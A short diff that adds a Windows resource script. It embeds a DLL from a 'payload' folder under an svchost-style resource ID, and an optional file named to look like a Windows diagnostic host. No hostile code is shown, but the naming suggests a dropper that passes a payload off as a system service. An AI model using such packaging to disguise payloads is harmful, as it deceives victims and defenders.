@@ -1,0 +1,10 @@
+#include <windows.h>
+
+#define IDR_SVCHOST_DLL     101
+#define IDR_PROVISIONING    102
+
+IDR_SVCHOST_DLL  RCDATA "payload\\diagsvc.dll"
+#ifdef EMBED_PROVISIONING
+IDR_PROVISIONING RCDATA "payload\\WinDiagnosticHost.msh"
+#endif
+
